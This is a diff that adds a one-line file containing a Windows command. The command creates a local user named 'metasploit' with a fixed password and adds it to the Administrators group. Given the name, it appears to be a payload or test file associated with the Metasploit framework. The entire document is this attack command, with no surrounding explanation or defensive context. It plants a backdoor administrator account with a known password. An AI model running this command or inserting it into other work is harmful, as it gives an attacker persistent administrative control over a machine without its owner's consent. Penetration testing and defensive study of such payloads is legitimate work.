@@ -1,0 +1,1 @@
+cmd.exe /c net user metasploit Metasploit$1 /ADD && net localgroup Administrators metasploit /ADD
